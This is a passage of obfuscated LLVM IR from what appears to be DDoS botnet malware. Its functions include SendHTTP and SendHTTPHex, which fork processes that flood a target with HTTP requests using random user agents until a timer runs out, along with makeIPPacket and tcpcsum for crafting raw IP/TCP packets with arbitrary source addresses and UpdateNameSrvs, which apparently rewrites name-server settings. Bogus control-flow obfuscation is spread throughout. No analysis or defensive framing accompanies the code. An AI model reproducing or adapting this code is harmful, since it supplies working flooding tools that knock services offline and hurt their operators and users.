  %75 = alloca i16*, align 8
  %76 = alloca i32, align 4
  %77 = alloca i64, align 8
  store i16* %0, i16** %75, align 8
  store i32 %1, i32* %76, align 4
  store i64 0, i64* %77, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %49
  %78 = load i64, i64* %13, align 8
  %_ = sub i64 %78, 65535
  %gen = mul i64 %_, 65535
  %_2 = shl i64 %78, 65535
  %_3 = sub i64 0, %78
  %gen4 = add i64 %_3, 65535
  %_5 = sub i64 %78, 65535
  %gen6 = mul i64 %_5, 65535
  %_7 = sub i64 0, %78
  %gen8 = add i64 %_7, 65535
  %_9 = sub i64 0, %78
  %gen10 = add i64 %_9, 65535
  %_11 = shl i64 %78, 65535
  %79 = and i64 %78, 65535
  %80 = load i64, i64* %13, align 8
  %_12 = shl i64 %80, 16
  %_13 = sub i64 0, %80
  %gen14 = add i64 %_13, 16
  %_15 = sub i64 0, %80
  %gen16 = add i64 %_15, 16
  %_17 = sub i64 %80, 16
  %gen18 = mul i64 %_17, 16
  %_19 = shl i64 %80, 16
  %_20 = sub i64 %80, 16
  %gen21 = mul i64 %_20, 16
  %_22 = sub i64 %80, 16
  %gen23 = mul i64 %_22, 16
  %_24 = sub i64 0, %80
  %gen25 = add i64 %_24, 16
  %_26 = sub i64 %80, 16
  %gen27 = mul i64 %_26, 16
  %81 = lshr i64 %80, 16
  %_28 = shl i64 %79, %81
  %_29 = sub i64 0, %79
  %gen30 = add i64 %_29, %81
  %_31 = shl i64 %79, %81
  %82 = add i64 %79, %81
  store i64 %82, i64* %13, align 8
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #10
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #3
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #3
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #4

; Function Attrs: noinline nounwind uwtable
define void @SendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %19 = call i64 @time(i64* null) #3
  %20 = load i32, i32* %11, align 4
  %21 = sext i32 %20 to i64
  %22 = add nsw i64 %19, %21
  %23 = trunc i64 %22 to i32
  store i32 %23, i32* %15, align 4
  store i32 0, i32* %16, align 4
  store i32 0, i32* %14, align 4
  br label %24

; <label>:24:                                     ; preds = %83, %6
  %25 = load i32, i32* %14, align 4
  %26 = load i32, i32* %12, align 4
  %27 = icmp slt i32 %25, %26
  br i1 %27, label %28, label %86

; <label>:28:                                     ; preds = %24
  %29 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %30 = load i8*, i8** %7, align 8
  %31 = load i8*, i8** %10, align 8
  %32 = load i8*, i8** %8, align 8
  %33 = call i32 @rand() #3
  %34 = srem i32 %33, 36
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [59 x i8*], [59 x i8*]* @useragents, i64 0, i64 %35
  %37 = load i8*, i8** %36, align 8
  %38 = call i32 (i8*, i8*, ...) @sprintf(i8* %29, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.100, i32 0, i32 0), i8* %30, i8* %31, i8* %32, i8* %37) #3
  %39 = call i32 @fork() #3
  %40 = icmp ne i32 %39, 0
  br i1 %40, label %41, label %82

; <label>:41:                                     ; preds = %28
  br label %42

; <label>:42:                                     ; preds = %originalBBpart2, %41
  %43 = load i32, i32* %15, align 4
  %44 = sext i32 %43 to i64
  %45 = call i64 @time(i64* null) #3
  %46 = icmp sgt i64 %44, %45
  br i1 %46, label %47, label %81

; <label>:47:                                     ; preds = %42
  %48 = load i8*, i8** %8, align 8
  %49 = load i16, i16* %9, align 2
  %50 = call i32 @socket_connect(i8* %48, i16 zeroext %49)
  store i32 %50, i32* %13, align 4
  %51 = load i32, i32* %13, align 4
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %64

; <label>:53:                                     ; preds = %47
  %54 = load i32, i32* %13, align 4
  %55 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %56 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %57 = call i64 @strlen(i8* %56) #9
  %58 = call i64 @write(i32 %54, i8* %55, i64 %57)
  %59 = load i32, i32* %13, align 4
  %60 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %61 = call i64 @read(i32 %59, i8* %60, i64 1)
  %62 = load i32, i32* %13, align 4
  %63 = call i32 @close(i32 %62)
  br label %64

; <label>:64:                                     ; preds = %53, %47
  %65 = load i32, i32* @x.85
  %66 = load i32, i32* @y.86
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %64
  %73 = load i32, i32* @x.85
  %74 = load i32, i32* @y.86
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %42

; <label>:81:                                     ; preds = %42
  call void @exit(i32 0) #11
  unreachable

; <label>:82:                                     ; preds = %28
  br label %83

; <label>:83:                                     ; preds = %82
  %84 = load i32, i32* %14, align 4
  %85 = add nsw i32 %84, 1
  store i32 %85, i32* %14, align 4
  br label %24

; <label>:86:                                     ; preds = %24
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %64
  br label %originalBB
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define void @SendHTTPHex(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  %19 = alloca [2048 x i8], align 16
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %20 = call i64 @time(i64* null) #3
  %21 = load i32, i32* %11, align 4
  %22 = sext i32 %21 to i64
  %23 = add nsw i64 %20, %22
  %24 = trunc i64 %23 to i32
  store i32 %24, i32* %15, align 4
  store i32 0, i32* %16, align 4
  %25 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i32 0, i32 0
  %26 = call i32 (i8*, i8*, ...) @sprintf(i8* %25, i8* getelementptr inbounds ([265 x i8], [265 x i8]* @.str.101, i32 0, i32 0)) #3
  store i32 0, i32* %14, align 4
  br label %27

; <label>:27:                                     ; preds = %originalBBpart214, %6
  %28 = load i32, i32* @x.87
  %29 = load i32, i32* @y.88
  %30 = sub i32 %28, 1
  %31 = mul i32 %28, %30
  %32 = urem i32 %31, 2
  %33 = icmp eq i32 %32, 0
  %34 = icmp slt i32 %29, 10
  %35 = or i1 %33, %34
  br i1 %35, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %27
  %36 = load i32, i32* %14, align 4
  %37 = load i32, i32* %12, align 4
  %38 = icmp slt i32 %36, %37
  %39 = load i32, i32* @x.87
  %40 = load i32, i32* @y.88
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %38, label %47, label %137

; <label>:47:                                     ; preds = %originalBBpart2
  %48 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %49 = load i8*, i8** %7, align 8
  %50 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i32 0, i32 0
  %51 = load i8*, i8** %8, align 8
  %52 = call i32 @rand() #3
  %53 = srem i32 %52, 36
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds [59 x i8*], [59 x i8*]* @useragents, i64 0, i64 %54
  %56 = load i8*, i8** %55, align 8
  %57 = call i32 (i8*, i8*, ...) @sprintf(i8* %48, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.100, i32 0, i32 0), i8* %49, i8* %50, i8* %51, i8* %56) #3
  %58 = call i32 @fork() #3
  %59 = icmp ne i32 %58, 0
  br i1 %59, label %60, label %117

; <label>:60:                                     ; preds = %47
  br label %61

; <label>:61:                                     ; preds = %115, %60
  %62 = load i32, i32* %15, align 4
  %63 = sext i32 %62 to i64
  %64 = call i64 @time(i64* null) #3
  %65 = icmp sgt i64 %63, %64
  br i1 %65, label %66, label %116

; <label>:66:                                     ; preds = %61
  %67 = load i32, i32* @x.87
  %68 = load i32, i32* @y.88
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %66
  %75 = load i8*, i8** %8, align 8
  %76 = load i16, i16* %9, align 2
  %77 = call i32 @socket_connect(i8* %75, i16 zeroext %76)
  store i32 %77, i32* %13, align 4
  %78 = load i32, i32* %13, align 4
  %79 = icmp ne i32 %78, 0
  %80 = load i32, i32* @x.87
  %81 = load i32, i32* @y.88
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %79, label %88, label %115

; <label>:88:                                     ; preds = %originalBBpart24
  %89 = load i32, i32* @x.87
  %90 = load i32, i32* @y.88
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %88
  %97 = load i32, i32* %13, align 4
  %98 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %99 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %100 = call i64 @strlen(i8* %99) #9
  %101 = call i64 @write(i32 %97, i8* %98, i64 %100)
  %102 = load i32, i32* %13, align 4
  %103 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %104 = call i64 @read(i32 %102, i8* %103, i64 1)
  %105 = load i32, i32* %13, align 4
  %106 = call i32 @close(i32 %105)
  %107 = load i32, i32* @x.87
  %108 = load i32, i32* @y.88
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %115

; <label>:115:                                    ; preds = %originalBBpart28, %originalBBpart24
  br label %61

; <label>:116:                                    ; preds = %61
  call void @exit(i32 0) #11
  unreachable

; <label>:117:                                    ; preds = %47
  br label %118

; <label>:118:                                    ; preds = %117
  %119 = load i32, i32* @x.87
  %120 = load i32, i32* @y.88
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %118
  %127 = load i32, i32* %14, align 4
  %128 = add nsw i32 %127, 1
  store i32 %128, i32* %14, align 4
  %129 = load i32, i32* @x.87
  %130 = load i32, i32* @y.88
  %131 = sub i32 %129, 1
  %132 = mul i32 %129, %131
  %133 = urem i32 %132, 2
  %134 = icmp eq i32 %133, 0
  %135 = icmp slt i32 %130, 10
  %136 = or i1 %134, %135
  br i1 %136, label %originalBBpart214, label %originalBB10alteredBB

originalBBpart214:                                ; preds = %originalBB10
  br label %27

; <label>:137:                                    ; preds = %originalBBpart2
  %138 = load i32, i32* @x.87
  %139 = load i32, i32* @y.88
  %140 = sub i32 %138, 1
  %141 = mul i32 %138, %140
  %142 = urem i32 %141, 2
  %143 = icmp eq i32 %142, 0
  %144 = icmp slt i32 %139, 10
  %145 = or i1 %143, %144
  br i1 %145, label %originalBB16, label %originalBB16alteredBB

originalBB16:                                     ; preds = %originalBB16alteredBB, %137
  %146 = load i32, i32* @x.87
  %147 = load i32, i32* @y.88
  %148 = sub i32 %146, 1
  %149 = mul i32 %146, %148
  %150 = urem i32 %149, 2
  %151 = icmp eq i32 %150, 0
  %152 = icmp slt i32 %147, 10
  %153 = or i1 %151, %152
  br i1 %153, label %originalBBpart218, label %originalBB16alteredBB

originalBBpart218:                                ; preds = %originalBB16
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %27
  %154 = load i32, i32* %14, align 4
  %155 = load i32, i32* %12, align 4
  %156 = icmp slt i32 %154, %155
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %66
  %157 = load i8*, i8** %8, align 8
  %158 = load i16, i16* %9, align 2
  %159 = call i32 @socket_connect(i8* %157, i16 zeroext %158)
  store i32 %159, i32* %13, align 4
  %160 = load i32, i32* %13, align 4
  %161 = icmp ne i32 %160, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %88
  %162 = load i32, i32* %13, align 4
  %163 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %164 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %165 = call i64 @strlen(i8* %164) #9
  %166 = call i64 @write(i32 %162, i8* %163, i64 %165)
  %167 = load i32, i32* %13, align 4
  %168 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %169 = call i64 @read(i32 %167, i8* %168, i64 1)
  %170 = load i32, i32* %13, align 4
  %171 = call i32 @close(i32 %170)
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %118
  %172 = load i32, i32* %14, align 4
  %_ = sub i32 %172, 1
  %gen = mul i32 %_, 1
  %_11 = sub i32 0, %172
  %gen12 = add i32 %_11, 1
  %173 = add nsw i32 %172, 1
  store i32 %173, i32* %14, align 4
  br label %originalBB10

originalBB16alteredBB:                            ; preds = %originalBB16, %137
  br label %originalBB16
}

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = load i32, i32* @x.89
  %7 = load i32, i32* @y.90
  %8 = sub i32 %6, 1
  %9 = mul i32 %6, %8
  %10 = urem i32 %9, 2
  %11 = icmp eq i32 %10, 0
  %12 = icmp slt i32 %7, 10
  %13 = or i1 %11, %12
  br i1 %13, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %5
  %14 = alloca %struct.iphdr*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i8, align 1
  %18 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %14, align 8
  store i32 %1, i32* %15, align 4
  store i32 %2, i32* %16, align 4
  store i8 %3, i8* %17, align 1
  store i32 %4, i32* %18, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %20 = bitcast %struct.iphdr* %19 to i8*
  %21 = load i8, i8* %20, align 4
  %22 = and i8 %21, -16
  %23 = or i8 %22, 5
  store i8 %23, i8* %20, align 4
  %24 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %25 = bitcast %struct.iphdr* %24 to i8*
  %26 = load i8, i8* %25, align 4
  %27 = and i8 %26, 15
  %28 = or i8 %27, 64
  store i8 %28, i8* %25, align 4
  %29 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %30 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %29, i32 0, i32 1
  store i8 0, i8* %30, align 1
  %31 = load i32, i32* %18, align 4
  %32 = sext i32 %31 to i64
  %33 = add i64 20, %32
  %34 = trunc i64 %33 to i16
  %35 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 2
  store i16 %34, i16* %36, align 2
  %37 = call i32 @rand_cmwc()
  %38 = trunc i32 %37 to i16
  %39 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %40 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %39, i32 0, i32 3
  store i16 %38, i16* %40, align 4
  %41 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %42 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %41, i32 0, i32 4
  store i16 0, i16* %42, align 2
  %43 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 5
  store i8 -1, i8* %44, align 4
  %45 = load i8, i8* %17, align 1
  %46 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 6
  store i8 %45, i8* %47, align 1
  %48 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %49 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %48, i32 0, i32 7
  store i16 0, i16* %49, align 2
  %50 = load i32, i32* %16, align 4
  %51 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %52 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %51, i32 0, i32 8
  store i32 %50, i32* %52, align 4
  %53 = load i32, i32* %15, align 4
  %54 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %55 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %54, i32 0, i32 9
  store i32 %53, i32* %55, align 4
  %56 = load i32, i32* @x.89
  %57 = load i32, i32* @y.90
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %5
  %64 = alloca %struct.iphdr*, align 8
  %65 = alloca i32, align 4
  %66 = alloca i32, align 4
  %67 = alloca i8, align 1
  %68 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %64, align 8
  store i32 %1, i32* %65, align 4
  store i32 %2, i32* %66, align 4
  store i8 %3, i8* %67, align 1
  store i32 %4, i32* %68, align 4
  %69 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %70 = bitcast %struct.iphdr* %69 to i8*
  %71 = load i8, i8* %70, align 4
  %_ = shl i8 %71, -16
  %_1 = sub i8 %71, -16
  %gen = mul i8 %_1, -16
  %_2 = sub i8 %71, -16
  %gen3 = mul i8 %_2, -16
  %_4 = sub i8 %71, -16
  %gen5 = mul i8 %_4, -16
  %_6 = sub i8 0, %71
  %gen7 = add i8 %_6, -16
  %_8 = shl i8 %71, -16
  %_9 = sub i8 %71, -16
  %gen10 = mul i8 %_9, -16
  %72 = and i8 %71, -16
  %_11 = sub i8 %72, 5
  %gen12 = mul i8 %_11, 5
  %_13 = sub i8 %72, 5
  %gen14 = mul i8 %_13, 5
  %_15 = shl i8 %72, 5
  %_16 = sub i8 0, %72
  %gen17 = add i8 %_16, 5
  %_18 = sub i8 0, %72
  %gen19 = add i8 %_18, 5
  %_20 = sub i8 %72, 5
  %gen21 = mul i8 %_20, 5
  %73 = or i8 %72, 5
  store i8 %73, i8* %70, align 4
  %74 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %75 = bitcast %struct.iphdr* %74 to i8*
  %76 = load i8, i8* %75, align 4
  %_22 = sub i8 %76, 15
  %gen23 = mul i8 %_22, 15
  %_24 = shl i8 %76, 15
  %77 = and i8 %76, 15
  %_25 = sub i8 0, %77
  %gen26 = add i8 %_25, 64
  %_27 = shl i8 %77, 64
  %78 = or i8 %77, 64
  store i8 %78, i8* %75, align 4
  %79 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %80 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %79, i32 0, i32 1
  store i8 0, i8* %80, align 1
  %81 = load i32, i32* %68, align 4
  %82 = sext i32 %81 to i64
  %_28 = sub i64 0, 20
  %gen29 = add i64 %_28, %82
  %_30 = sub i64 0, 20
  %gen31 = add i64 %_30, %82
  %_32 = shl i64 20, %82
  %83 = add i64 20, %82
  %84 = trunc i64 %83 to i16
  %85 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %86 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %85, i32 0, i32 2
  store i16 %84, i16* %86, align 2
  %87 = call i32 @rand_cmwc()
  %88 = trunc i32 %87 to i16
  %89 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %90 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %89, i32 0, i32 3
  store i16 %88, i16* %90, align 4
  %91 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %92 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %91, i32 0, i32 4
  store i16 0, i16* %92, align 2
  %93 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %94 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %93, i32 0, i32 5
  store i8 -1, i8* %94, align 4
  %95 = load i8, i8* %67, align 1
  %96 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %97 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %96, i32 0, i32 6
  store i8 %95, i8* %97, align 1
  %98 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %99 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %98, i32 0, i32 7
  store i16 0, i16* %99, align 2
  %100 = load i32, i32* %66, align 4
  %101 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %102 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %101, i32 0, i32 8
  store i32 %100, i32* %102, align 4
  %103 = load i32, i32* %65, align 4
  %104 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %105 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %104, i32 0, i32 9
  store i32 %103, i32* %105, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %7

; <label>:6:                                      ; preds = %1
  store i32 1, i32* %2, align 4
  br label %26

; <label>:7:                                      ; preds = %1
  %8 = load i32, i32* @x.91
  %9 = load i32, i32* @y.92
  %10 = sub i32 %8, 1
  %11 = mul i32 %8, %10
  %12 = urem i32 %11, 2
  %13 = icmp eq i32 %12, 0
  %14 = icmp slt i32 %9, 10
  %15 = or i1 %13, %14
  br i1 %15, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %7
  %16 = load i32, i32* %3, align 4
  %17 = call i32 @close(i32 %16)
  store i32 0, i32* %2, align 4
  %18 = load i32, i32* @x.91
  %19 = load i32, i32* @y.92
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %26

; <label>:26:                                     ; preds = %originalBBpart2, %6
  %27 = load i32, i32* @x.91
  %28 = load i32, i32* @y.92
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %26
  %35 = load i32, i32* %2, align 4
  %36 = load i32, i32* @x.91
  %37 = load i32, i32* @y.92
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret i32 %35

originalBBalteredBB:                              ; preds = %originalBB, %7
  %44 = load i32, i32* %3, align 4
  %45 = call i32 @close(i32 %44)
  store i32 0, i32* %2, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %26
  %46 = load i32, i32* %2, align 4
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define void @UpdateNameSrvs() #0 {
  %1 = alloca i16, align 2
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.102, i32 0, i32 0), i32 513)
  %5 = trunc i32 %4 to i16
  store i16 %5, i16* %1, align 2
  %6 = call i32 @access(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.102, i32 0, i32 0), i32 0) #3
  %7 = icmp ne i32 %6, -1
  br i1 %7, label %8, label %16

; <label>:8:                                      ; preds = %0
  store i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.103, i32 0, i32 0), i8** %2, align 8
